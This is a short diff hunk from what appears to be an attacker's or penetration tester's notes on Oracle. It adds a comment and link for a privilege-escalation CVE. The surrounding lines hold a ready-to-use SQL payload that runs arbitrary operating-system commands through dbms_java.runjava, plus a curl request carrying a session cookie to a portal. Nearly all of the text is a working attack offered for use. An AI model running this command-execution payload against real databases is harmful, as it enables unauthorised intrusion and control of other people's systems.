@@ -129,3 +129,6 @@ curl -H 'Cookie: <set-cookie>' https://blah/dav_portal/portal/
 
 # rce through dbms_java.runjava
 select dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"') from dual
+
+# privesc CVE-2018-3004
+http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html
